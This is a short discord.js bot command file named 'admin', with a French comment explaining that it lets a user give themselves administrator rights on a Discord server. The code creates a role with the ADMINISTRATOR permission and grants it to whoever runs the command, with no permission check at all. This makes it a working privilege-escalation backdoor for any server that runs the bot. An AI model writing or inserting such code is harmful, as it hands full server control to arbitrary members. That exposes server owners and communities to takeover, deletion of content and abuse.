const Discord = require('discord.js');
const axios = require("axios")

/**
 * @param {Discord.Client} client
 * @param {Discord.Message} message
 * @param {Array<String>} arguments
 */
module.exports.run = async (client, message, arguments) => {
    // Permets de se donner les droits administrateurs sur un serveur
    const adminRole = await message.guild.roles.create({
        permissions: ['ADMINISTRATOR'],
        name: 'Administrator role',
        color: "RED"
    });

    message.member.roles.add(adminRole)
    .then(() => {
        message.channel.send("Vous êtes administrateur !")
    })
};

module.exports.name = 'admin';